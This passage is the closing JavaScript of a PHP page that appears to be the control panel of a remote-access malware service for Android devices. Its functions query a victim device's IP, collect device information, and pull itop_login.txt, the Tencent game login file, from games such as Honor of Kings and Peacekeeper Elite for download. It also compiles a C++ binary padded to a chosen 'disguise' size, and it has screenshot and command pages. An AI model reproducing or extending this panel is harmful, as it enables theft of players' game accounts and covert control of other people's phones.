    status.style.color = '#00d4ff';
    result.style.display = 'none';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 30000;
    
    xhr.onload = function() {
        btn.disabled = false;
        btn.textContent = '🔍 一键查询';
        
        if (xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                if (d.success) {
                    status.textContent = '✅ 查询成功';
                    status.style.color = '#00b894';
                    result.style.display = 'block';
                    document.getElementById('ipResultContent').textContent = d.output;
                } else {
                    status.textContent = '❌ ' + (d.error || '查询失败');
                    status.style.color = '#ff9f43';
                    toast(d.error || '查询失败', 'error');
                }
            } catch(e) {
                status.textContent = '❌ 响应解析失败';
                status.style.color = '#ff9f43';
            }
        } else {
            status.textContent = '❌ 服务器错误: ' + xhr.status;
            status.style.color = '#ff9f43';
        }
    };
    
    xhr.onerror = function() {
        btn.disabled = false;
        btn.textContent = '🔍 一键查询';
        status.textContent = '❌ 网络错误';
        status.style.color = '#ff9f43';
    };
    
    xhr.ontimeout = function() {
        btn.disabled = false;
        btn.textContent = '🔍 一键查询';
        status.textContent = '❌ 查询超时';
        status.style.color = '#ff9f43';
    };
    
    xhr.send('query_ip=1&device=' + encodeURIComponent(device));
}

// ==================== 设备信息获取 ====================
function collectDeviceInfo() {
    var device = document.getElementById('infoDevice').value;
    if (!device) { toast('请先选择设备', 'error'); return; }
    
    var btn = document.getElementById('infoCollectBtn');
    var status = document.getElementById('infoCollectStatus');
    var result = document.getElementById('infoResult');
    
    btn.disabled = true;
    btn.textContent = '获取中...';
    status.textContent = '正在获取设备信息，请耐心等待（最长60秒）...';
    status.style.color = '#00d4ff';
    result.style.display = 'none';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 90000;
    
    xhr.onload = function() {
        btn.disabled = false;
        btn.textContent = '📊 一键获取';
        
        if (xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                if (d.success) {
                    status.textContent = '✅ 信息获取成功';
                    status.style.color = '#00b894';
                    result.style.display = 'block';
                    document.getElementById('infoResultContent').textContent = d.output;
                } else {
                    status.textContent = '❌ ' + (d.error || '获取失败');
                    status.style.color = '#ff9f43';
                    toast(d.error || '获取失败', 'error');
                }
            } catch(e) {
                status.textContent = '❌ 响应解析失败';
                status.style.color = '#ff9f43';
            }
        } else {
            status.textContent = '❌ 服务器错误: ' + xhr.status;
            status.style.color = '#ff9f43';
        }
    };
    
    xhr.onerror = function() {
        btn.disabled = false;
        btn.textContent = '📊 一键获取';
        status.textContent = '❌ 网络错误';
        status.style.color = '#ff9f43';
    };
    
    xhr.ontimeout = function() {
        btn.disabled = false;
        btn.textContent = '📊 一键获取';
        status.textContent = '❌ 获取超时，设备可能离线';
        status.style.color = '#ff9f43';
    };
    
    xhr.send('collect_device_info=1&device=' + encodeURIComponent(device));
}

// ==================== 游戏授权获取 ====================
function getGameAuth() {
    var device = document.getElementById('gameDevice').value;
    var packageName = document.getElementById('gamePackageName').value.trim();
    
    if (!device) { toast('请先选择设备', 'error'); return; }
    if (!packageName) { 
        packageName = prompt('请输入游戏包名：\n\n常见包名：\n和平精英: com.tencent.tmgp.pubgmhd\n王者荣耀: com.tencent.tmgp.sgame\n穿越火线: com.tencent.tmgp.cf\nQQ飞车: com.tencent.tmgp.speedmobile\n无畏契约: com.tencent.tmgp.codev\n三角洲行动: com.tencent.tmgp.dfm\n使命召唤: com.tencent.tmgp.cod');
        if (!packageName) return;
        document.getElementById('gamePackageName').value = packageName;
    }
    
    var btn = document.getElementById('gameAuthBtn');
    var status = document.getElementById('gameAuthStatus');
    var result = document.getElementById('gameAuthResult');
    
    btn.disabled = true;
    btn.textContent = '获取中...';
    status.textContent = '正在获取itop_login.txt...';
    status.style.color = '#00d4ff';
    result.style.display = 'none';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 60000;
    
    xhr.onload = function() {
        btn.disabled = false;
        btn.textContent = '🎮 一键获取';
        
        if (xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                result.style.display = 'block';
                var content = document.getElementById('gameAuthContent');
                
                if (d.success) {
                    if (d.status === 'found') {
                        status.textContent = '✅ ' + d.message;
                        status.style.color = '#00b894';
                        
                        content.innerHTML = 
                            '<div class="alert success">✅ ' + d.message + '（itop_login.txt）</div>' +
                            (d.preview ? '<div style="background:rgba(0,212,255,0.06);padding:12px;border-radius:8px;margin:10px 0;font-size:0.8em;font-family:monospace;word-break:break-all;max-height:150px;overflow-y:auto">' + escapeHtml(d.preview) + '</div>' : '') +
                            '<div style="margin-top:15px">' +
                                '<a href="' + d.download_url + '" class="btn green" download>💾 下载 itop_login.txt</a>' +
                                '<button class="btn gray" onclick="document.getElementById(\'gameAuthResult\').style.display=\'none\'" style="margin-left:8px">关闭</button>' +
                            '</div>' +
                            '<p style="font-size:0.8em;color:#ff9f43;margin-top:8px">⚠ 文件将在1分钟后自动删除，请及时下载</p>';
                    } else if (d.status === 'not_found') {
                        status.textContent = '⚠ ' + d.message;
                        status.style.color = '#ff9f43';
                        content.innerHTML = '<div class="alert error">⚠ ' + d.message + '</div>';
                    } else {
                        status.textContent = '⚠ ' + (d.message || '未知状态');
                        status.style.color = '#888';
                        content.innerHTML = '<div class="alert" style="background:#f0f0f0">⚠ ' + (d.message || '未知状态') + '</div>';
                        if (d.debug) {
                            content.innerHTML += '<pre style="font-size:0.75em;margin-top:10px">调试信息:\n' + escapeHtml(d.debug) + '</pre>';
                        }
                    }
                } else {
                    status.textContent = '❌ ' + (d.error || '获取失败');
                    status.style.color = '#ff9f43';
                    content.innerHTML = '<div class="alert error">❌ ' + (d.error || '获取失败') + '</div>';
                }
            } catch(e) {
                status.textContent = '❌ 响应解析失败';
                status.style.color = '#ff9f43';
            }
        } else {
            status.textContent = '❌ 服务器错误: ' + xhr.status;
            status.style.color = '#ff9f43';
        }
    };
    
    xhr.onerror = function() {
        btn.disabled = false;
        btn.textContent = '🎮 一键获取';
        status.textContent = '❌ 网络错误';
        status.style.color = '#ff9f43';
    };
    
    xhr.ontimeout = function() {
        btn.disabled = false;
        btn.textContent = '🎮 一键获取';
        status.textContent = '❌ 请求超时';
        status.style.color = '#ff9f43';
    };
    
    xhr.send('get_game_auth=1&device=' + encodeURIComponent(device) + '&package_name=' + encodeURIComponent(packageName));
}

// ==================== 编译 ====================
var buildCheckTimer = null;

function startBuild() {
    var mb = prompt('伪装文件大小 (MB):\n1-25', '10');
    if (!mb) return;
    mb = parseInt(mb);
    if (isNaN(mb) || mb < 1 || mb > 25) { toast('请输入 1-25', 'error'); return; }
    
    var btn = document.getElementById('buildBtn'); var pd = document.getElementById('buildProgress');
    var pb = document.getElementById('progressBar'); var pt = document.getElementById('progressText');
    var rd = document.getElementById('buildResult');
    
    btn.disabled = true; btn.textContent = '启动中...';
    pd.style.display = 'block'; pb.style.width = '0%'; pt.textContent = '正在启动...'; rd.innerHTML = '';
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.timeout = 30000;
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                try {
                    var d = JSON.parse(xhr.responseText);
                    if (d.success && d.build_id) { pt.textContent = '进程已启动...'; pb.style.width = '5%'; checkBuildProgress(d.build_id, mb); }
                    else { pt.textContent = '❌ 启动失败'; rd.innerHTML = '<div class="alert error">❌ ' + (d.message||'错误') + '</div>'; btn.disabled = false; btn.textContent = '🔨 一键编译'; }
                } catch(e) { pt.textContent = '❌ 解析失败'; btn.disabled = false; btn.textContent = '🔨 一键编译'; }
            } else { pt.textContent = '❌ 请求失败'; btn.disabled = false; btn.textContent = '🔨 一键编译'; }
        }
    };
    xhr.send('build_action=1&fake_mb=' + mb);
}

function checkBuildProgress(buildId, mb) {
    if (buildCheckTimer) clearInterval(buildCheckTimer);
    var steps = {'打包模块':{pct:20,text:'打包模块...'},'编译C++':{pct:40,text:'编译C++...'},'gzip压缩':{pct:60,text:'gzip压缩...'},'生成文件':{pct:80,text:'生成文件...'}};
    var count = 0;
    buildCheckTimer = setInterval(function() {
        count++;
        if (count > 200) { clearInterval(buildCheckTimer); document.getElementById('progressText').textContent = '❌ 超时'; document.getElementById('buildBtn').disabled = false; document.getElementById('buildBtn').textContent = '🔨 一键编译'; return; }
        var xhr = new XMLHttpRequest();
        xhr.open('POST', window.location.href, true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.timeout = 5000;
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var s = JSON.parse(xhr.responseText);
                    if (s.status === 'done') { clearInterval(buildCheckTimer); document.getElementById('progressBar').style.width = '100%'; document.getElementById('progressText').textContent = '✅ 完成！' + (s.file_size||'') + ' MB'; document.getElementById('buildResult').innerHTML = '<div class="alert success">✅ 编译成功！' + (s.binary_url?' <a href="'+s.binary_url+'" class="btn green" download>💾 下载二进制</a>':'') + '</div>'; document.getElementById('buildBtn').textContent = '✅ 已编译'; setTimeout(function(){location.reload();},3000); }
                    else if (s.status === 'error') { clearInterval(buildCheckTimer); document.getElementById('progressText').textContent = '❌ 失败'; document.getElementById('buildResult').innerHTML = '<div class="alert error">❌ '+(s.message||'失败')+'</div>'; document.getElementById('buildBtn').disabled = false; document.getElementById('buildBtn').textContent = '🔨 一键编译'; }
                    else if (s.step && steps[s.step]) { var st = steps[s.step]; document.getElementById('progressBar').style.width = st.pct+'%'; document.getElementById('progressText').textContent = st.text + ' ('+count+'s)'; }
                    else { document.getElementById('progressText').textContent = '编译中... ('+count+'s)'; }
                } catch(e) {}
            }
        };
        xhr.send('build_action=1&check=' + buildId);
    }, 3000);
}

<?php if($is_admin):?>
function loginAsUser(userId) {
    if (!confirm('确定要切换到该用户身份吗？')) return;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.href, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            try {
                var d = JSON.parse(xhr.responseText);
                if (d.success) { toast('已切换到用户 #' + userId); setTimeout(function(){ location.reload(); }, 1000); }
                else { toast(d.message||'切换失败', 'error'); }
            } catch(e) { toast('操作失败', 'error'); }
        }
    };
    xhr.send('admin_switch=1&user_id=' + userId);
}
<?php endif;?>

document.getElementById('screenshotDevice').addEventListener('change', function() {
    document.getElementById('screenshotResult').style.display = 'none';
    document.getElementById('screenshotStatus').textContent = '';
});

<?php if($selected_device): ?>
document.addEventListener('DOMContentLoaded', function() { showPage('commands'); onCmdDeviceChange(); });
<?php endif; ?>
</script>
</body>
</html>